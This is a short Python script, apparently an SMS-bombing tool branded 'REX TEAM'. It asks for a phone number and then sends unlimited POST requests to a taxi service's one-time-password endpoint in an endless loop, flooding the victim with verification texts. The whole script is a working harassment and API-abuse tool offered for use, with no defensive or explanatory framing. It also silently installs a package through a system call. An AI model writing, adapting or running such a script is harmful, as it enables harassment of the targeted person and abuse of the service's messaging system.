import requests
import os
red='\033[31m'
green='\033[32m'
yellow= '\033[33m'
blue = '\033[34m'
url = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
os.system("clear")
os.system("apt install figlet -y")
os.system("clear")
print(f"{green}===========================================")
print(f"{yellow}  REX TEAM DEVLOPER   |   TEAMSPEAK IP : REXTS.IR  ")
print(f"{green}===========================================")
print(f"{red} [1]"+ f"{green} start")
print(f"{red} [2]"+ f"{red} exit")
king = int(input(f"{red} [~]"+ f"{green} REX==>"))
if king == 1:
    hacker = input("Enter phone Number (+989++++++) : ")
    while True:
              requests.post(url,data={"cellphone":hacker})
              print("sended to =>", hacker)
elif king == 2:
    os.system("clear")
    print("have nice day =) ")
